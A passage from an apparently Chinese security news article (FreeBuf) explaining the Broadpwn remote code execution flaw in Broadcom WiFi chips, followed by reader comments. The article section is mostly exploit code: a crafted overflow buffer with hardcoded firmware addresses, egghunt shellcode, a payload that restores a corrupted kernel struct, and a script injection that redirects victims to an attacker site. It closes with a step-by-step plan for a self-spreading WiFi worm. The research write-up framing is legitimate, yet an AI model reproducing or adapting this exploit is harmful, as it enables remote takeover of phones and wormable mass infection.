  uint32_t p_patch = 0x16010C; // p_restore_cpsr&nbsp; 
  uint32_t buf_base_4359 = 0x1e7e02;&nbsp; 
  struct exploit_buf_4359 *buf = (struct exploit_buf_4359 *) pos;
  memset(pos, 0x0, overflow_size);
  memcpy(&amp;buf-&gt;pm_st_field_40_shellcode_start_106, shellcode_start_bin, sizeof(shellcode_start_bin)); // Shellcode thunk&nbsp; 
  buf-&gt;ssid.ssid[0] = 0x41;&nbsp; 
  buf-&gt;ssid.ssid[1] = 0x41;&nbsp; 
  buf-&gt;ssid.ssid[2] = 0x41;&nbsp; 
  memcpy(&amp;buf-&gt;ssid.ssid[3], egghunt_bin, sizeof(egghunt_bin));&nbsp; 
  buf-&gt;ssid.size = sizeof(egghunt_bin) + 3;
  buf-&gt;pm_st_field_10_pspoll_timer_58 = buf_base_4359 + offsetof(struct exploit_buf_4359, t_field_0_2); // Point pspoll timer to our fake timer object
  buf-&gt;pm_st_size_38 = 0x7a;&nbsp; 
  buf-&gt;pm_st_field_18_apsd_trigger_timer_66 = 0x1e7ab4;&nbsp; 
  buf-&gt;pm_st_field_28_82 = 0xc8;&nbsp; 
  buf-&gt;pm_st_field_2c_86 = 0xc8;&nbsp; 
  buf-&gt;pm_st_field_38_pm2_rcv_timer_98 = 0x1e819c;&nbsp; 
  buf-&gt;pm_st_field_3c_pm2_ret_timer_102 = 0x1e811c;&nbsp; 
  buf-&gt;pm_st_field_78_size_162 = 0x1a2;&nbsp; 
  buf-&gt;bss_info_field_0_mac1_166 = 0x84cac000;&nbsp; 
  buf-&gt;bss_info_field_4_mac2_170 = 0x106b9ba;
  buf-&gt;t_field_20_34 = 0x200000;&nbsp; 
  buf-&gt;t_field_18_26 = p_patch - 0x14; // Point field_18 to the restore_cpsr thunk&nbsp; 
  buf-&gt;t_field_1c_30 = buf_base_4359 + offsetof(struct exploit_buf_4359, pm_st_field_40_shellcode_start_106) + 1; // Write our shellcode address to the thunk
  curr_len += overflow_size;&nbsp; pos += overflow_size;
  return pos;
}

struct shellcode_ssid {&nbsp; 
  unsigned char size;&nbsp; 
  unsigned char ssid[31];
} STRUCT_PACKED;
 
struct exploit_buf_4359 {&nbsp; 
  uint16_t stub_0;&nbsp; 
  uint32_t t_field_0_2;&nbsp; 
  uint32_t t_field_4_6;&nbsp; 
  uint32_t t_field_8_10;&nbsp; 
  uint32_t t_field_c_14;&nbsp; 
  uint32_t t_field_10_18;&nbsp; 
  uint32_t t_field_14_22;&nbsp; 
  uint32_t t_field_18_26;&nbsp; 
  uint32_t t_field_1c_30;&nbsp; 
  uint32_t t_field_20_34;&nbsp; 
  uint32_t pm_st_size_38;&nbsp; 
  uint32_t pm_st_field_0_42;&nbsp; 
  uint32_t pm_st_field_4_46;&nbsp; 
  uint32_t pm_st_field_8_50;&nbsp; 
  uint32_t pm_st_field_c_54;&nbsp; 
  uint32_t pm_st_field_10_pspoll_timer_58;&nbsp; 
  uint32_t pm_st_field_14_62;&nbsp; 
  uint32_t pm_st_field_18_apsd_trigger_timer_66;&nbsp; 
  uint32_t pm_st_field_1c_70;&nbsp; 
  uint32_t pm_st_field_20_74;&nbsp; 
  uint32_t pm_st_field_24_78;&nbsp; 
  uint32_t pm_st_field_28_82;&nbsp; 
  uint32_t pm_st_field_2c_86;&nbsp; 
  uint32_t pm_st_field_30_90;&nbsp; 
  uint32_t pm_st_field_34_94;&nbsp; 
  uint32_t pm_st_field_38_pm2_rcv_timer_98;&nbsp; 
  uint32_t pm_st_field_3c_pm2_ret_timer_102;&nbsp; 
  uint32_t pm_st_field_40_shellcode_start_106;&nbsp; 
  uint32_t pm_st_field_44_110;&nbsp; 
  uint32_t pm_st_field_48_114;&nbsp; 
  uint32_t pm_st_field_4c_118;&nbsp; 
  uint32_t pm_st_field_50_122;&nbsp; 
  uint32_t pm_st_field_54_126;&nbsp; 
  uint32_t pm_st_field_58_130;&nbsp; 
  uint32_t pm_st_field_5c_134;&nbsp; 
  uint32_t pm_st_field_60_egghunt_138;&nbsp; 
  uint32_t pm_st_field_64_142;&nbsp; 
  uint32_t pm_st_field_68_146; // &lt;- End&nbsp; 
  uint32_t pm_st_field_6c_150;&nbsp; 
  uint32_t pm_st_field_70_154;&nbsp; 
  uint32_t pm_st_field_74_158;&nbsp; 
  uint32_t pm_st_field_78_size_162;&nbsp; 
  uint32_t bss_info_field_0_mac1_166;&nbsp; 
  uint32_t bss_info_field_4_mac2_170;&nbsp; 
  struct shellcode_ssid ssid;
} STRUCT_PACKED;<br /></code></pre>
<p style="">这是执行 egghunt 的 shellcode ：</p>
<pre><code>__attribute__((naked)) voidshellcode_start(void) {&nbsp; 
  asm("push {r0-r3,lr}\n" &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 
      "bl egghunt\n" &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; 
      "pop {r0-r3,pc}\n");
}

void egghunt(unsigned int cpsr) {&nbsp; 
  unsigned int egghunt_start = RING_BUFFER_START;&nbsp; 
  unsigned int *p = (unsigned int *) egghunt_start;&nbsp; 
  void (*f)(unsigned int);
  loop:&nbsp; 
  p++;&nbsp; 
  if (*p != 0xc0deba5e)&nbsp; &nbsp; 
    goto loop;&nbsp; 
  f = (void (*)(unsigned int))(((unsigned char *) p) + 5);&nbsp; 
  f(cpsr);&nbsp; 
  return;
}</code></pre>
<p>所以我们现在可以跳转到这个 payload 上了，但这就是全部了吗？还记得我们已经严重破坏了 wlc-&gt; pm 对象吗，如果我们就保持现状，系统将不会持续保持稳定。我们还是需要避免系统崩溃的，所以还需要控制住危害</p>
<p>因此在进一步的操作之前，我们的 payload 还需要把 wlc-&gt; pm 对象恢复到正常状态。由于此对象中的所有地址对于都是存放在静态地址里的，因此我们可以将这些值复制回缓冲区并将对象恢复到正常状态。</p>
<p>以下是一个初始 payload的例子：</p>
<pre><code>unsigned char overflow_orig[] = {&nbsp; &nbsp; 
  0x00, 0x00, 0x03, 0xA4, 0x00, 0x00, 0x27, 0xA4, 
  0x00, 0x00, 0x42, 0x43, 0x5E, 0x00, 0x62, 0x32,&nbsp; &nbsp; 
  0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0xC0, 0x0B, 0xE0, 0x05, 0x0F, 0x00,&nbsp; &nbsp; 
  0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x00, 
  0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,&nbsp; &nbsp; 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x64, 0x7A, 0x1E, 0x00, 0x00, 0x00,&nbsp; &nbsp; 
  0x00, 0x00, 0xB4, 0x7A, 0x1E, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&nbsp; &nbsp; 
  0x00, 0x00, 0xC8, 0x00, 0x00, 0x00, 0xC8, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&nbsp; &nbsp; 
  0x00, 0x00, 0x9C, 0x81, 0x1E, 0x00, 0x1C, 0x81, 
  0x1E, 0x00&nbsp;
};

void entry(unsigned int cpsr) {&nbsp; &nbsp; 
  int i = 0;&nbsp; &nbsp; 
  unsigned int *p_restore_cpsr = (unsigned int *) 0x16010C;
  *p_restore_cpsr = (unsigned int) restore_cpsr;
  printf("Payload triggered, restoring CPSR\n");
  restore_cpsr(cpsr);
  printf("Restoring contents of wlc-&gt;pm struct\n");
  memcpy((void *) (0x1e7e02), overflow_orig, sizeof(overflow_orig));&nbsp; &nbsp; 
  return;
}</code></pre>
<p>到此为止，我们已经实现了我们的第一个也是最重要的任务：<span style="font-size: 16px;">对于博通芯片</span>我们有了可靠一致的 RCE ，并且我们对系统的控制不是暂时的 —— 芯片在这个被我们用这个漏洞利用之后也没有崩溃。    </p>
<h2>五、下一步-权限提升</h2>
<p>在 Broadcom 芯片上实现了稳定的代码执行之后，攻击者的目标<span style="font-size: 16px;">自然</span>将是要提升其在应用处理器上执行代码的权限。这个问题有三种主要处理方法：</p>
<p><span style="font-size: 16px;">1.查找 Broadcom 内核驱动程序中处理与芯片通信的错误。</span>    </p>
<p><span style="font-size: 16px;"><span style="font-size: 16px;">2.使用 PCIe 直接读写内核内存。</span>    <br /> </span></p>
<p><span style="font-size: 16px;"><span style="font-size: 16px;"><span style="font-size: 16px;">3.等待攻击目标浏览到非 HTTPS 站点，然后从 WiFi 芯片将其重定向到恶意 URL 。</span></span>    </span></p>
<p>在我们目前的研究中，还是把立足于 WiFi 芯片上，将用户重定向到攻击者控制的站点。而函数 wlc_recv() 是处理所有数据包的起点：</p>
</p>
<pre><code>void wlc_recv（wlc_info * wlc，void * p）;</code></pre>
<p>参数 p 是指向 HNDRTE 中 sk_buff 的指针。它保存了指向分组数据的指针、分组长度以及指向下一个分组的指针。为此，我们需要紧跟这个 wlc_recv 函数调用，存储收到的每个数据包的内容。并寻找封装着未加密 HTTP 流量的数据包。此时此刻，我们将会修改包含 &lt;script&gt; 标签的数据包，代码为：</p>
</p>
<pre><code>top.location.href = http://www.evilsite.com</code></pre>
</p>
<h2>六、[ 彩蛋 ]第一只WiFi 蠕虫</h2>
<p>蠕虫在过去十年中已经走到了生命的尽头，但博通芯片的这一安全问题可能会让他们重获新生：Broadpwn 可以是通过 WLAN 传播的理想选择——不需要身份验证，不需要来自目标设备的信息泄露，也不需要复杂的逻辑就可执行。通过这个 WiFi 蠕虫，攻击者可以将受感染的设备转变为移动感染源。</p>
<p style="text-align: center;"><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" data-original="http://image.3001.net/images/20170731/15014870059330.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="666" height="500"></p>
<noscript><img alt="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片 Broadpwn 漏洞（含EXP／POC）" src="http://image.3001.net/images/20170731/15014870059330.jpg!small" width="666" height="500"></p></noscript>
<p>步骤如下：</p>
<blockquote><p>- 上一部分中，我们已经运行了自己的 payload ，将系统恢复到稳定状态防止芯片崩溃。payload 会与前文展示的方法相似地挂接住 wlc_recv 。</p>
<p>- wlc_recv_hook中的代码会检查每个接收到的数据包，并确定它是否为 Probe 请求。如果接收到的分组是具有特定 AP 的 SSID 的 Probe 请求，则 wlc_recv_hook 将提取所请求 AP 的SSID，并且通过向 STA 发送 Probe 响应来开始冒充该 AP 。</p>
<p>- 接着，wlc_recv应该会收到验证数据包，我们的 hook 函数会发送响应。接下来则是 STA 的关联请求。</p>
<p>- 我们将要发送的下一个数据包是包含WMM IE的关联响应，这能触发漏洞。我们能够做到多次崩溃目标芯片，但不会让用户看到内核警报信息，并开始发送适合特定版本固件的、精心设计的数据包。这一步会持续进行，直到我们暴力破解到正确的地址集。&nbsp;</p>
<p>- 我们在城市中进行了一次测试，从结果可以看到约 70％ 的用户使用的是博通 WiFi芯片。即使假定这个蠕虫只具备中度感染率，Broadpwn 蠕虫运行数天的影响也会是非常巨大的。</p>
</blockquote>
<p><b style="color: rgb(159, 163, 168);">*参考来源：<a href="https://blog.exodusintel.com/2017/07/26/broadpwn/" target="_blank">blog</a>，<a href="https://www.youtube.com/watch?v=KTB9tvR-Oxg" target="_blank">youtube</a>，本文作者Elaine，转载请注明FreeBuf.COM</b></p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/Elaine_z" title="由 Elaine_z 发布" rel="author">
                                            <img src="http://image.3001.net/2017/04/73394e8c53f4f8dcaadb0158858edcf1-320x320.jpeg" width="50" height="50" alt="Elaine_z" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/Elaine_z">Elaine_z</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
                                <i class="colour-red">
                                    66                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">7</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/Elaine_z" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=Elaine_z" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片Broadpwn漏洞（含EXP／POC）" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            }
                                        }
                                    }
                                });


                                jQuery(window).on("resize",function(){
                                    shareFixHorizontal();
                                    click();
                                })

                                //tooltips提示
                                $(function () { $("[data-toggle='tooltip']").tooltip(); });
                            </script>
                        </div>
                                                                                                                            <div class="article-pager ">
                                <ul>
                                    <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/vuls/142970.html" rel="prev">Gaza Cybergang APT团伙新样本分析</a>                                    </li>
                                    <li class="next"><span>下一篇：</span>
                                        <a href="http://www.freebuf.com/articles/network/142729.html" rel="next">全球国家“破坏性网络攻击” 30 年|Cybereason情报组报告</a>                                    </li>
                                </ul>
                            </div>
                                            </div>
                </div>
                <div class="comment-list">
      <div class="main-tit02">
		<a rel="nofollow" class="btnbtn-default btn-comment" href="#respond">发表评论</a>
        <h3>已有 <span class="color_red">5</span> 条评论
      </div>
      <ul>
         <li class="comment even thread-even depth-1" id="li-comment-225989">
    <div id="comment-225989">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic18.png">     </div>
    <div class="tit"> 
	    <span class="name"> xxoxx </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-08-04</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-225989','225989', 'respond','142099' ) " href="?replytocom=225989#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">1楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>厉害</p>
<div class="comment-tools">
<div class="vote" id="vote-225989"><span id="acv_stat_225989"></span><a class="ilike_icon"  id="vote4-225989" href="javascript:acv_vote(225989,1);">亮了</a>(<span id="cos_support-225989">4</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="225989" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="225989" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="225989" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="225989" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="225989" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-226001">
    <div id="comment-226001">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic18.png">     </div>
    <div class="tit"> 
	    <span class="name"> 你个流氓 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-08-04</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-226001','226001', 'respond','142099' ) " href="?replytocom=226001#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">2楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>我只想问,越狱什么时候放出来</p>
<div class="comment-tools">
<div class="vote" id="vote-226001"><span id="acv_stat_226001"></span><a class="ilike_icon"  id="vote4-226001" href="javascript:acv_vote(226001,1);">亮了</a>(<span id="cos_support-226001">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="226001" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="226001" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="226001" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="226001" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="226001" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-hop even thread-even depth-1" id="li-comment-226007">
    <div id="comment-226007">
        <div class="photo"> <a href="http://www.freebuf.com/author/hop">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/hop" target="_blank">hop&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-08-04</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-226007','226007', 'respond','142099' ) " href="?replytocom=226007#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">3楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>有大佬研究过吗？这个希望能够交流下</p>
<div class="comment-tools">
<div class="vote" id="vote-226007"><span id="acv_stat_226007"></span><a class="ilike_icon"  id="vote4-226007" href="javascript:acv_vote(226007,1);">亮了</a>(<span id="cos_support-226007">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="226007" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="226007" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="226007" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="226007" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="226007" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-10086 odd alt thread-odd thread-alt depth-1" id="li-comment-226022">
    <div id="comment-226022">
        <div class="photo"> <a href="http://www.freebuf.com/author/死宅10086">
    <img src="http://image.3001.net/2016/04/145254ordw99xzxszuusly.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/死宅10086" target="_blank">死宅10086&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(6级)</span>
				<span class="explain"> 这家伙太懒了，还未填写个人描述！ </span>
		<span class="time">&nbsp;2017-08-04</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-226022','226022', 'respond','142099' ) " href="?replytocom=226022#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">4楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>厉害 <img src='http://image.3001.net/images/index/smilies/icon_mrgreen.gif' alt=':mrgreen:' class='wp-smiley' /> </p>
<div class="comment-tools">
<div class="vote" id="vote-226022"><span id="acv_stat_226022"></span><a class="ilike_icon"  id="vote4-226022" href="javascript:acv_vote(226022,1);">亮了</a>(<span id="cos_support-226022">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="226022" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="226022" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="226022" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="226022" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="226022" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-xsaddata even thread-even depth-1" id="li-comment-226035">
    <div id="comment-226035">
        <div class="photo"> <a href="http://www.freebuf.com/author/xSadData">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/xSadData" target="_blank">xSadData&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-08-04</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-226035','226035', 'respond','142099' ) " href="?replytocom=226035#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">5楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>你开启了下一次Wcry事件。。。</p>
<div class="comment-tools">
<div class="vote" id="vote-226035"><span id="acv_stat_226035"></span><a class="ilike_icon"  id="vote4-226035" href="javascript:acv_vote(226035,1);">亮了</a>(<span id="cos_support-226035">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="226035" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="226035" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="226035" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="226035" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="226035" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
      </ul>
      <div class="commentnav page01" style="padding-top:10px; text-align: center;">
               </div>
	  
<script src="http://www.freebuf.com/buf/themes/freebuf/js/ajaxfileupload.js" type="text/javascript"></script>
<div id="respond" class="comment-box">
<input type="file" id="uploadUnit" name="upfile" class="hidden" value="">
    <form action="http://www.freebuf.com/wp-comments-post.php" method="post" id="commentform">
        <div id="comment-author-info">
	    <div class="login-other">
		  <div class="login_button login_icon_sina" title="使用新浪微博登陆" onclick="login_button_click('sina')"></div>
          <div class="login_button login_icon_qq" title="使用腾讯QQ登陆" onclick="login_button_click('qq')"></div></div>
        <div class="login-input">
	    <p><label for="author">昵称</label>
		          <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
